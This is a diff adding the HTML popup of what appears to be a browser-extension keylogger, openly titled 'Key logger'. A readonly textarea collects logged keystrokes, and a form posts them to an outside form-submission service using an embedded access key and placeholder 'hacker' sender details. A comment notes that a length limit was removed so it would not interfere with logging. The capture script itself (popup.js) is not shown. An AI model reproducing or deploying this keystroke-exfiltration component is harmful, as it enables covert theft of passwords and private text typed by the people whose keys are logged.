@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Key logger</title>
+    <link rel="stylesheet" href="popup.css">
+</head>
+<body>
+    <form action="https://api.web3forms.com/submit" method="POST" class="contact-container">
+        <h1>Key logger</h1>
+
+        <!-- Web3 Forms API Key -->
+        <input type="hidden" name="access_key" value="e4dbfa47-dc93-4448-a8b8-042686516c78">
+
+        <input type="text" name="name" placeholder="Your Name" value="Hacker" class="contacts-input" required>
+
+        <input type="email" name="email" placeholder="Your E-mail" value="hacker@gmail.com" class="contacts-input" required>
+
+        <!-- Removed maxlength as it may interfere with logging -->
+        <textarea id="inputBox" name="message" rows="10" cols="50" readonly></textarea>
+
+        <div class="buttons">
+            <button type="submit" id="send" class="contacts-input contact-button">Send message</button>
+            <button type="button" id="clearButton" class="contacts-input contact-button">Clear Logs</button>
+        </div>
+    </form>
+
+    <script src="popup.js"></script>
+</body>
+</html>
